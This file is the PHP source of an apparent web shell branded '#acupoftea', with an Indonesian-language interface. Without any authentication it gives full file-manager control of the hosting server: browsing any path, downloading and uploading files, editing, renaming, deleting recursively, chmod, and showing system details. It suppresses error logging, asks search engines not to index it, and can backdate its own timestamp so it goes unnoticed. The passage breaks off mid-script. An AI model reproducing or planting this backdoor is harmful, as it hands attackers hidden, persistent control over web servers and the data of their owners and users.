<?php

session_start();
error_reporting(0);
set_time_limit(0);
clearstatcache();
ini_set('error_log', null);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
ini_set('output_buffering', 0);
ini_set('display_errors', 0);

if (isset($_GET['tea']) && $_GET['tea'] === 'download') {
    @ob_clean();
    $berkas = $_GET['barang'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($berkas) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($berkas));
    readfile($berkas);
    exit;
}

if (isset($_GET['lokasi'])) {
    $lokasi = $_GET['lokasi'];
    chdir($_GET['lokasi']);
} else {
    $lokasi = getcwd();
}

$lokasi    = str_replace('\\', '/', $lokasi);
$lokasimod = explode('/', $lokasi);
$scanisi   = scandir($lokasi);

function size($berkas) {
    $a    = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos  = 0;
    $size = filesize($berkas);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2) . " " . $a[$pos];
}

function pesan($message, $color, $gantiurl = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["color"])) {
        unset($_SESSION["color"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["color"]   = $color;
    if ($gantiurl) {
        header('Location: ' . $gantiurl);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["color"])) {
        unset($_SESSION["color"]);
    }
    return true;
}

if (isset($_POST['namaFolderBaru'])) {
    $namafolderbaru   = $_POST['namaFolderBaru'];
    $lokasifolderbaru = $lokasi . '/' . $namafolderbaru;
    if (!file_exists($lokasifolderbaru) && mkdir($lokasifolderbaru)) {
        pesan("Sukses membuat folder $namafolderbaru.", "#14A44D", "?lokasi=$lokasi");
    } else {
        pesan("Gagal saat membuat folder $namafolderbaru.", "#DC4C64", "?lokasi=$lokasi");
    }
}

if (isset($_POST['namaBerkasBaru'])) {
    $namaBerkasBaru   = $_POST['namaBerkasBaru'];
    $lokasiBerkasBaru = $lokasi . '/' . $namaBerkasBaru;

    if (!file_exists($lokasiBerkasBaru)) {
        if (isset($_POST['isiBerkasBaru'])) {
            $isiBerkasBaru = $_POST['isiBerkasBaru'];
            $berkas        = fopen($lokasiBerkasBaru, 'w');
            if ($berkas) {
                if (fwrite($berkas, $isiBerkasBaru) !== false) {
                    fclose($berkas);
                    pesan("Sukses membuat berkas $namaBerkasBaru.", "#14A44D", "?lokasi=$lokasi");
                } else {
                    pesan("Gagal saat membuat berkas $namaBerkasBaru.", "#DC4C64", "?lokasi=$lokasi");
                }
            } else {
                pesan("Gagal membuka $namaBerkasBaru untuk ditulis.", "#DC4C64", "?lokasi=$lokasi");
            }
        } else {
            if (touch($lokasiBerkasBaru)) {
                pesan("Sukses membuat berkas $namaBerkasBaru.", "#14A44D", "?lokasi=$lokasi");
            } else {
                pesan("Gagal saat membuat berkas $namaBerkasBaru.", "#DC4C64", "?lokasi=$lokasi");
            }
        }
    } else {
        pesan("Gagal $namaBerkasBaru telah ada.", "#E4A11B", "?lokasi=$lokasi");
    }
}

if (isset($_POST['gantiNamaBarang']) && isset($_POST['namaBaru'])) {
    if ($_POST['namaBaru'] == '') {
        pesan("Peringatan, masukan tidak boleh kosong.", "#E4A11B", "?lokasi=$lokasi");
    } else {
        $barang           = $_POST['gantiNamaBarang'];
        $namabaru         = $_POST['namaBaru'];
        $lokasinamaberkas = $lokasi . '/' . $namabaru;
        if (file_exists($barang)) {
            if (rename($barang, $lokasinamaberkas)) {
                pesan("Sukses mengganti nama $barang ke $namabaru.", "#14A44D", "?lokasi=$lokasi");
            } else {
                pesan("Gagal saat mengganti nama $barang.", "#DC4C64", "?lokasi=$lokasi");
            }
        } else {
            pesan("Peringatan $barang tidak ditemukan.", "#E4A11B", "?lokasi=$lokasi");
        }
    }
}

if (isset($_GET['barang']) && isset($_POST['isiBaru'])) {
    $barang     = $_GET['barang'];
    $lokasiFile = $lokasi . '/' . $barang;
    $berkas     = fopen($lokasiFile, 'w');
    if ($berkas) {
        if (fwrite($berkas, $_POST['isiBaru']) !== false) {
            fclose($berkas);
            pesan("Sukses menyunting $barang.", "#14A44D", "?lokasi=$lokasi");
        } else {
            pesan("Gagal saat menyunting $barang.", "#DC4C64", "?lokasi=$lokasi");
        }
    } else {
        pesan("Gagal membuka $barang untuk ditulis.", "#DC4C64", "?lokasi=$lokasi");
    }
}


if (isset($_POST['tanggalBarang']) && isset($_POST['tanggalBaru'])) {
    $tanggalbaru = strtotime($_POST['tanggalBaru']);
    $barang      = $_POST['tanggalBarang'];
    if ($tanggalbaru == '') {
        pesan("Peringatan, masukan tidak boleh kosong.", "#E4A11B", "?lokasi=$lokasi");
    }
    if (touch($lokasi . '/' . $barang, $tanggalbaru)) {
        pesan("Sukses mengubah tanggal untuk $barang.", "#14A44D", "?lokasi=$lokasi");
    } else {
        pesan("Gagal saat mengubah tanggal untuk $barang.", "#DC4C64", "?lokasi=$lokasi");
    }
}

if (isset($_POST['izinBarang']) && isset($_POST['izinBaru'])) {
    $barang = $_POST['izinBarang'];
    if ($_POST['izinBaru'] == '') {
        pesan("Peringatan, masukan tidak boleh kosong.", "#E4A11B", "?lokasi=$lokasi");
    }
    if (chmod($lokasi . '/' . $barang, $_POST['izinBaru'])) {
        pesan("Sukses mengubah izin untuk $barang.", "#14A44D", "?lokasi=$lokasi");
    } else {
        pesan("Gagal saat mengubah izin untuk $barang.", "#DC4C64", "?lokasi=$lokasi");
    }
}

function hapusFolder($lokasi) {
    if (!is_dir($lokasi)) {
        return false;
    }
    $berkasarray = array_diff(scandir($lokasi), array('.', '..'));
    foreach ($berkasarray as $berkas) {
        $lokasibarang = $lokasi . '/' . $berkas;
        if (is_dir($lokasibarang)) {
            hapusFolder($lokasibarang);
        } else {
            unlink($lokasibarang);
        }
    }
    return rmdir($lokasi);
}

if (isset($_POST['hapusBarang'])) {
    $barang = $_POST['hapusBarang'];
    if (is_file($barang)) {
        if (unlink($barang)) {
            pesan("Sukses menghapus berkas $barang.", "#14A44D", "?lokasi=$lokasi");
        } else {
            pesan("Gagal saat mencoba menghapus berkas $barang.", "#DC4C64", "?lokasi=$lokasi");
        }
    } elseif (is_dir($barang)) {
        if (hapusFolder($barang)) {
            pesan("Sukses menghapus folder $barang.", "#14A44D", "?lokasi=$lokasi");
        } else {
            pesan("Gagal saat mencoba menghapus folder $barang.", "#DC4C64", "?lokasi=$lokasi");
        }
    } else {
        pesan("Peringatan $barang tidak ditemukan.", "#E4A11B", "?lokasi=$lokasi");
    }
}

if (array_key_exists('berkas', $_FILES)) {
    $total  = count($_FILES['berkas']['name']);
    $sukses = 0;

    for ($i = 0; $i < $total; $i++) {
        $tempberkas   = $_FILES['berkas']['tmp_name'][$i];
        $targetberkas = $_FILES['berkas']['name'][$i];
        if (move_uploaded_file($tempberkas, $targetberkas)) {
            $sukses++;
        } else {
            if (copy($tempberkas, $targetberkas)) {
                $sukses++;
            }
        }
    }
    if ($total === 1) {
        if ($sukses === 1) {
            $filename = $_FILES['berkas']['name'][0];
            pesan("Mengunggah $filename sukses! ", "#14A44D", "?lokasi=$lokasi");
        } else {
            pesan("Gagal saat mengunggah $filename.", "#DC4C64", "?lokasi=$lokasi");
        }
    } else {
        if ($sukses === $total) {
            pesan("Mengunggah $sukses berkas sukses! ", "#14A44D", "?lokasi=$lokasi");
        } else {
            pesan("Gagal saat mengunggah berkas.", "#DC4C64", "?lokasi=$lokasi");
        }
    }
}

if (isset($_GET['tea']) && $_GET['tea'] === 'gantitanggal') {
    $tanggalbaru = strtotime('2023-06-01 10:10:00');
    if (touch(__FILE__, $tanggalbaru)) {
        pesan("Mengubah tanggal untuk file ini sukses! ", "#14A44D", "?lokasi=$lokasi");
    } else {
        pesan("Gagal saat mengubah file ini.", "#DC4C64", "?lokasi=$lokasi");
    }
}

?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <title>#acupoftea - <?= $_SERVER['HTTP_HOST']; ?></title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-9ndCyUaIbzAi2FUVXJi0CjmCapSmO7SnpJef0486qhLnuZ2cdeRhO02iuK6FUUVM" crossorigin="anonymous">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css">
        <link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
        <style type="text/css">
            * {
                font-family: Ubuntu Mono;
            } .custom {
                width: 120px;
                text-overflow: ellipsis;
                white-space: nowrap;
                overflow: hidden;
            } .custom-btn {
                width: 100px;
                text-overflow: ellipsis;
                white-space: nowrap;
                overflow: hidden;
            } a {
                color: #000;
                text-decoration: none;
            } a:hover {
                color: #14A44D;
            } ::-webkit-scrollbar {
                width: 7px;
                height: 7px;
            } ::-webkit-scrollbar-thumb {
                background: grey;
                border-radius: 7px;
            } ::-webkit-scrollbar-track {
                box-shadow: inset 0 0 7px grey;
                border-radius: 7px;
            }
        </style>
    </head>
    <body class="bg-light">
        <div class="container-fluid py-3 p-5">
            <h1 class="text-center">#a cup of tea</h1>
            <div class="row justify-content-between align-items-center py-2">
                <div class="col-md-auto">
                    <table class="table table-sm table-borderless table-light">
                        <tr>
                            <td style="width: 7%;">Sistem</td>
                            <td style="width: 1%">:</td>
                            <td><?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Tidak ada informasi sistem."; ?>.</td>
                        </tr>
                        <tr>
                            <td style="width: 7%;">Perangkat</td>
                            <td style="width: 1%">:</td>
                            <td><?= $_SERVER['SERVER_SOFTWARE'] ?>.</td>
                        </tr>
                        <tr>
                            <td style="width: 7%;">Server</td>
                            <td style="width: 1%">:</td>
                            <td><?= gethostbyname($_SERVER['HTTP_HOST']) ?>.</td>
                        </tr>
                        <tr>
                            <td style="width: 7%;"><i class="bi bi-folder2-open align-middle"></i></td>
                            <td style="width: 1%">:</td>
                            <td>
                               <?php
                                    foreach ($lokasimod as $id => $pat) {
                                        if ($pat == '' && $id == 0){
                                ?>
                                <a href="?lokasi=/">/</a>
                                <?php } if ($pat == '') continue; ?>

                                <a href="?lokasi=<?php for ($i = 0; $i <= $id; $i++) { echo "$lokasimod[$i]"; if ($i != $id) echo "/"; } ?>"><?= $pat ?></a>
                                <span> /</span>
                                <?php } ?>

                            </td>
                        </tr>
                    </table>
                </div>
                <div class="col-md-auto">
                    <div class="row justify-content-end">
                        <div class="col-md-auto">
                            <table class="table-borderless">
                                <tr>
                                    <td><?= $_SERVER['REMOTE_ADDR'] ?></td>
                                </tr>
                                <form action="" method="post" enctype="multipart/form-data">
                                    <tr>
                                        <td>
                                            <label for="ups" class="btn btn-outline-dark btn-sm custom" id="uputama">Pilih Berkas</label>
                                            <input type="file" class="form-control d-none" name="berkas[]"  id="ups" multiple>
                                        </td>
                                        <td>
                                            <button class="btn btn-outline-dark btn-sm" type="submit">Unggah</button>
                                        </td>
                                    </tr>
                                </form>
                            </table>
                        </div>
                    </div>
                </div>
            </div>

            <div class="container mb-2">
                <center>
                    <a href="?" class="btn btn-outline-dark btn-sm custom-btn mb-2"><i class="bi bi-house-check"></i> Beranda</a>
                    <a href="?lokasi=<?= $lokasi ?>&tea=gantitanggal" class="btn btn-outline-dark btn-sm custom-btn mb-2"><i class="bi bi-folder-check"></i> Tanggal</a>
                    <button type="button" class="btn btn-outline-dark btn-sm custom-btn mb-2" data-bs-toggle="modal" data-bs-target="#tentangIni"><i class="bi bi-info-square"></i> Tentang</button>
                </center>

                <!-- Modal Tentang -->
                <div class="modal fade" id="tentangIni" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="tentangIniLabel" aria-hidden="true">
                    <div class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="tentangIniLabel"><i class="bi bi-info-square"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <center>
                                    <div class="table-responsive">
                                        <table class="table table-sm table-borderless">
                                            <tr>
                                                <td style="width: 7%;">Sistem</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= isset($_SERVER['SERVER_SOFTWARE']) ? php_uname() : "Tidak ada informasi sistem."; ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Perangkat</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['SERVER_SOFTWARE'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Server</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= gethostbyname($_SERVER['HTTP_HOST']) ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Alamat IP</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['REMOTE_ADDR'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Port</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['SERVER_PORT'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Protokol</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['SERVER_PROTOCOL'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Request</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['REQUEST_METHOD'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Koneksi</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['HTTP_CONNECTION'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Root</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['DOCUMENT_ROOT'] ?>.</td>
                                            </tr>
                                            <tr>
                                                <td style="width: 7%;">Browser</td>
                                                <td style="width: 1%">:</td>
                                                <td><?= $_SERVER['HTTP_USER_AGENT'] ?>.</td>
                                            </tr>
                                        </table>
                                    </div>
                                    <hr>
                                    <span>ACUPOFTEA untuk <?= $_SERVER['HTTP_HOST']; ?>.</span><br>
                                </center>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Tutup</button>
                            </div>
                        </div>
                    </div>
                </div>
                <!-- Modal Tambah Folder -->
                <div class="modal fade" id="tambahFolder" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="tambahFolderLabel" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="tambahFolderLabel"><i class="bi bi-folder-plus"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <label class="form-label">Nama Folder</label>
                                <input type="text" class="form-control" name="namaFolderBaru" placeholder="acupoftea">
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Batal</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">Simpan</button>
                            </div>
                        </div>
                    </form>
                </div>
                <!-- Modal Tambah Berkas -->
                <div class="modal fade" id="tambahFile" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="tambahFileLabel" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="tambahFileLabel"><i class="bi bi-file-earmark-plus"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="mb-3">
                                    <label class="form-label">Nama File</label>
                                    <input type="text" class="form-control" name="namaBerkasBaru" placeholder="acupof.tea">
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Isi File</label>
                                    <textarea class="form-control" rows="7" name="isiBerkasBaru" placeholder="Hello World! ( optional. )"></textarea>
                                </div>
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Batal</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">Simpan</button>
                            </div>
                        </div>
                    </form>
                </div>

                <!-- Modal Edit Berkas -->
                <div class="modal fade" id="editModal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="modalEditTitle" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="modalEditTitle"><i class="bi bi-file-earmark-code"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <div class="mb-3">
                                    <?php
                                        if (isset($_GET['tea']) && isset($_GET['barang'])) {
                                            if ($_GET['tea'] === 'edit') {
                                                $barang = $_GET['barang'];
                                    ?>

                                    <label class="form-label">Berkas <font color="red"><?= $barang ?></font></label>
                                    <textarea class="form-control" rows="15" name="isiBaru" id="content"><?= htmlspecialchars(file_get_contents($lokasi . '/' . $barang)) ?></textarea>
                                    <?php
                                            }
                                        }
                                    ?>

                                </div>
                            </div>
                            <div class="modal-footer">
                                <a href="?lokasi=<?= $lokasi ?>" class="btn btn-outline-danger btn-sm">Batal</a>
                                <button type="button" class="btn btn-outline-dark btn-sm" onclick="salin()">Salin</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">Simpan</button>
                            </div>
                        </div>
                    </form>
                </div>
                <!-- Modal Ganti Nama -->
                <div class="modal fade" id="modalGantiNama" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="modalGantiNamaTitle" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="modalGantiNamaTitle"><i class="bi bi-pencil-square"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <label class="form-label">Nama baru untuk <span id="gantinamabarang" style="color: red"></span></label>
                                <input type="text" class="form-control" name="namaBaru" placeholder="acupoftea">
                                <input type="hidden" id="gantinamabarangtetap" name="gantiNamaBarang" value="">
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Batal</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">Simpan</button>
                            </div>
                        </div>
                    </form>
                </div>
                <!-- Modal Hapus -->
                <div class="modal fade" id="modalHapus" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="modalHapusTitle" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="modalHapusTitle"><i class="bi bi-trash"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <label class="form-label">Apa kamu yakin akan menghapus <span id="hapusbarang" style="color: red"></span> ?</label>
                                <input type="hidden" id="hapusbarangtetap" name="hapusBarang" value="">
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-dark btn-sm" data-bs-dismiss="modal">Batal</button>
                                <button type="submit" class="btn btn-outline-danger btn-sm">Hapus</button>
                            </div>
                        </div>
                    </form>
                </div>

                <!-- Modal Tanggal -->
                <div class="modal fade" id="modalTanggal" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="modalTanggalTitle" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="modalTanggalTitle"><i class="bi bi-calendar3"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <label class="form-label">Tanggal baru untuk <span id="tanggalbarang" style="color: red"></span></label>
                                <input type="text" class="form-control" name="tanggalBaru" placeholder="acupoftea">
                                <input type="hidden" id="tanggalbarangtetap" name="tanggalBarang" value="">
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Batal</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">Simpan</button>
                            </div>
                        </div>
                    </form>
                </div>
                <!-- Modal Izin -->
                <div class="modal fade" id="modalIzin" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="modalIzinTitle" aria-hidden="true">
                    <form action="" method="post" class="modal-dialog modal-dialog-centered">
                        <div class="modal-content">
                            <div class="modal-header">
                                <h1 class="modal-title fs-5" id="modalIzinTitle"><i class="bi bi-exclamation-triangle"></i></h1>
                                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                            </div>
                            <div class="modal-body">
                                <label class="form-label">Izin baru untuk <span id="izinbarang" style="color: red"></span></label>
                                <input type="text" class="form-control" name="izinBaru" placeholder="acupoftea">
                                <input type="hidden" id="izinbarangtetap" name="izinBarang" value="">
                            </div>
                            <div class="modal-footer">
                                <button type="button" class="btn btn-outline-danger btn-sm" data-bs-dismiss="modal">Batal</button>
                                <button type="submit" class="btn btn-outline-dark btn-sm">Simpan</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
            <?php
                if (!is_readable($lokasi)) {
                    echo '<center>';
                    echo '403 Folder tidak bisa diakses.';
                    echo '<br>';
                    echo '<hr width="20%">';
                    echo '<div class="text-dark">';
                    echo '<span>~ ACUPOFTEA - ' . $_SERVER['HTTP_HOST'] . '</span>';
                    echo '</div>';
                    echo '</center>';
                    exit();
                }
            ?>

            <div class="table-responsive">
                <table class="table table-hover table-light align-middle text-dark">
                    <thead class="align-middle">
                        <tr>
                            <td style="width:30%">Nama</td>
                            <td style="width:15%">Tipe</td>
                            <td style="width:15%">Ukuran</td>
                            <td style="width:15%">Perizinan</td>
                            <td style="width:15%">Terakhir Diubah</td>
                            <td style="width:10%">Aksi</td>
                        </tr>
                    </thead>
                    <tbody class="table-group-divider">
                        <?php
                            foreach ($scanisi as $barang) {
                                if (is_dir($barang)) {
                        ?>

                        <tr>
                            <td>
                                <?php
                                    if ($barang === '..') {
                                        echo '<a href="?lokasi=' . dirname($lokasi) . '"><i class="bi bi-folder2-open"></i> ' . $barang . '</a>';
                                    } elseif ($barang === '.') {
                                        echo '<a href="?lokasi=' . $lokasi . '"><i class="bi bi-folder2-open"></i> ' . $barang . '</a>';
                                    } else {
                                        echo '<a href="?lokasi=' . $lokasi . '/' . $barang .'"><i class="bi bi-folder"></i> ' . $barang . '</a>';
                                    }
                                ?>

                            </td>
                            <td>folder</td>
                            <td>-</td>
                            <td>
                                <a style="cursor: pointer;" class="izin-btn" data-barang="<?= $barang ?>" data-isi-barang="<?= substr(sprintf('%o', fileperms($barang)), -4); ?>">
                                <?php echo is_writable($lokasi . '/' . $barang) ? '<font color="#14A44D">' : (!is_readable($lokasi . '/' . $barang) ? '<font color="#DC4C64">' : ''); ?>
                                <?php echo substr(sprintf('%o', fileperms($barang)), -4); ?></font>
                                <?php if(is_writable($lokasi . '/' . $barang) || !is_readable($lokasi . '/' . $barang)) ?>

                                </a>        
                            </td>
                            <td>
                                <a style="cursor: pointer;" class="tanggal-btn" data-barang="<?= $barang ?>" data-isi-barang="<?= date("Y-m-d h:i:s", filemtime($barang)); ?>"><?= date("Y-m-d h:i:s", filemtime($barang)); ?></a>
                            </td>
                            <td>
                                <?php
                                    if ($barang != '.' && $barang != '..') {
                                ?>

                                <div class="btn-group">
                                    <button type="button" class="btn btn-outline-dark btn-sm mr-1 gantinama-btn" data-barang="<?= $barang ?>"><i class="bi bi-pencil-square"></i></button>
                                    <button type="button" class="btn btn-outline-dark btn-sm mr-1 hapus-btn" data-barang="<?= $barang ?>"><i class="bi bi-trash"></i></button>
                                </div>
                                <?php
                                    } elseif ($barang === '.') {
                                ?>

                                <div class="btn-group">
                                    <button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#tambahFolder"><i class="bi bi-folder-plus"></i></button>
                                    <button type="button" class="btn btn-outline-dark btn-sm mr-1" data-bs-toggle="modal" data-bs-target="#tambahFile"><i class="bi bi-file-earmark-plus"></i></button>
                                </div>
                                <?php
                                    }
                                ?>

                            </td>
                        </tr>
                        <?php
                                }
                            }

                            foreach ($scanisi as $barang) {
                                if (is_file($barang)) {
                        ?>

                        <tr>
                            <td>
                                <a href="?lokasi=<?= $lokasi ?>&barang=<?= $barang ?>&tea=edit"><i class="bi bi-file-earmark"></i> <?= $barang ?></a>
                            </td>
                            <td><?= (function_exists('mime_content_type') ? mime_content_type($barang) : filetype($barang)) ?></td>
                            <td><?= size($barang) ?></td>
                            <td>
                                <a style="cursor: pointer;" class="izin-btn" data-barang="<?= $barang ?>" data-isi-barang="<?= substr(sprintf('%o', fileperms($barang)), -4); ?>">
                                <?php echo is_writable($lokasi . '/' . $barang) ? '<font color="#14A44D">' : (!is_readable($lokasi . '/' . $barang) ? '<font color="#DC4C64">' : ''); ?>
                                <?php echo substr(sprintf('%o', fileperms($barang)), -4); ?></font>
                                <?php if(is_writable($lokasi . '/' . $barang) || !is_readable($lokasi . '/' . $barang)) ?>

                                </a>
                            </td>
                            <td>
                                <a style="cursor: pointer;" class="tanggal-btn" data-barang="<?= $barang ?>" data-isi-barang="<?= date("Y-m-d h:i:s", filemtime($barang)); ?>"><?= date("Y-m-d h:i:s", filemtime($barang)); ?></a>
                            </td>
                            <td>
                                <?php
                                    if ($barang != '.' && $barang != '..') {
                                ?>

                                <div class="btn-group">
                                    <a href="?lokasi=<?= $lokasi ?>&barang=<?= $barang ?>&tea=edit" class="btn btn-outline-dark btn-sm mr-1"><i class="bi bi-file-earmark-code"></i></a>
                                    <button type="button" class="btn btn-outline-dark btn-sm mr-1 gantinama-btn" data-barang="<?= $barang ?>"><i class="bi bi-pencil-square"></i></button>
                                    <a href="?lokasi=<?= $lokasi ?>&barang=<?= $barang ?>&tea=download" class="btn btn-outline-dark btn-sm mr-1"><i class="bi bi-download"></i></a>
                                    <button type="button" class="btn btn-outline-dark btn-sm mr-1 hapus-btn" data-barang="<?= $barang ?>"><i class="bi bi-trash"></i></button>
                                </div>
                                <?php
                                    }
                                ?>

                            </td>
                        </tr>
                        <?php
                                }
                            }
                        ?>

                    </tbody>
                </table>
            </div>
            <center>
                <?php
                    if (count($scanisi) === 2) {
                        echo 'Folder ini kosong.';
                    }
                ?>
                <hr width='20%'>
                <div class="text-dark">
                    <span>~ ACUPOFTEA - <?= $_SERVER['HTTP_HOST']; ?></span>
                </div>
            </center>
        </div>
        <script src="https://code.jquery.com/jquery-3.7.0.js" integrity="sha256-JlqSTELeR4TLqP0OG9dxM7yDPqX1ox/HfgiSLBj8+kM=" crossorigin="anonymous"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js" integrity="sha384-geWF76RCwLtnZ8qwWowPQNguL3RmwHVBC9FhGdlKrxdiJJigb/j/68SIy3Te4Bkz" crossorigin="anonymous"></script>
        <script type="text/javascript">
            
            <?php if (isset($_GET['tea']) && isset($_GET['barang']) && $_GET['tea'] === 'edit') : ?>
                $(document).ready(function() { $("#editModal").modal("show"); });
            <?php endif; ?>

            <?php if (isset($_SESSION['message'])) : ?>
                notifikasi('<?= $_SESSION['message'] ?>', '<?= $_SESSION['color'] ?>')
            <?php endif; clear(); ?>

            function salin() {
                var textarea = document.getElementById('content');
                textarea.select();
                document.execCommand('copy');
                textarea.setSelectionRange(0, 0);
                notifikasi('Sukses untuk menyalin teks!', '#14A44D');
            }

            function notifikasi(pesan, warna) {
                var notifikasi                   = document.createElement('div');
                notifikasi.textContent           = pesan;
                notifikasi.style.position        = 'fixed';
                notifikasi.style.bottom          = '20px';
                notifikasi.style.left            = '20px';
                notifikasi.style.padding         = '10px';
                notifikasi.style.borderRadius    = '4px';
                notifikasi.style.zIndex          = '9999';
                notifikasi.style.opacity         = '0';
                notifikasi.style.color           = '#fff';
                notifikasi.style.backgroundColor = warna;

                document.body.appendChild(notifikasi);

                var opacity = 0;
                var fadeInInterval = setInterval(function() {
                    opacity += 0.1;
                    notifikasi.style.opacity = opacity.toString();
                    if (opacity >= 1) {
                        clearInterval(fadeInInterval);
                        setTimeout(function() {
                            var fadeOutInterval = setInterval(function() {
                                opacity -= 0.1;
                                notifikasi.style.opacity = opacity.toString();
                                if (opacity <= 0) {
                                    clearInterval(fadeOutInterval);
                                    document.body.removeChild(notifikasi);
                                }
                            }, 30);
                        }, 3000);
                    }
                }, 30);
            }

            $(document).ready(function() {;
                // Date
                $('.tanggal-btn').click(function() {
                    var namaBarang = $(this).data('barang');
                    var isiBarang  = $(this).data('isi-barang');
                    $('input[name="tanggalBaru"]').val(isiBarang);
                    $('#tanggalbarang').text(namaBarang);
                    $('#tanggalbarangtetap').val(namaBarang);
                    $('#modalTanggal').modal('show');
                })

                // chmod
                $('.izin-btn').click(function() {
                    var namaBarang = $(this).data('barang');
                    var isiBarang  = $(this).data('isi-barang');
                    $('input[name="izinBaru"]').val(isiBarang);
                    $('#izinbarang').text(namaBarang);
                    $('#izinbarangtetap').val(namaBarang);
                    $('#modalIzin').modal('show');
